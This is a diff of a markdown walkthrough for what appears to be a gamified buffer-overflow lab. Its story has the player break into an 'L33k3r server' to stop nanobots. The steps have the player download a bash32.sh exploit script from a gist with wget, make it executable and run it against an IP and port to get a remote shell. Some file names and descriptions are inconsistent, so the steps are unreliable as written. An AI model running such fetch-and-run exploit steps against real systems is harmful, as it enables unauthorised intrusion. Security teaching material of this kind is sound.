@@ -62,7 +62,7 @@ Now let us list the files in this directory
 Let's read the bufover-2.c file. This is a c file contiang c code. This will generate 
 - `cat bufover-2.c`
 
-Now we will read the bufover-2 file. This file is the executable for the file we just read. Meaning it will run that file.
+Now we will read the bufover-2 file. This file is the executable for the file we just read. Meaning it will run bufover-2.c.
 - `cat bufover-2`
 
 Let's run the executable
@@ -79,15 +79,20 @@ The program is asking us a few questions, lets answer them by pressing the enter
 - `enter`
 - `enter`
 
-Next we are get some code that will help us infiltrate a server. This code is a script we will run which will create a completely new Bash Terminal that will have control over that server
+Next we are going to download some code made by Alice and Bob that will help us infiltrate the L33k3r server. 
+
+The code below is a script we will run which will create a completely new Bash Terminal that will have control over their server!
 - `wget https://gist.githubusercontent.com/AndyNovo/217341c2818dc569294c86ffafc0ef9b/raw/530536eb4dd081869651f85d1c4ca04f8183b0c7/bash32.sh`
 
 The command below will give the file we just downloaded exectuable permission.
 - `chmod +x bash32.ch`
 
-Now let's run out script to infiltrate out local server!
+Now let's run out script to infiltrate the L33k3r Server!
 - `./bash32.sh buffer-2 ipaddr port`
 
 ---
 
+![Access Granted](https://ak.picdn.net/shutterstock/videos/33710788/thumb/5.jpg)
+
+You have now sucessfully infiltrated the L33k3r server. Now look around using the terminal to try and find anything we can use to shutdown their system or to shut down the nanobots!
 
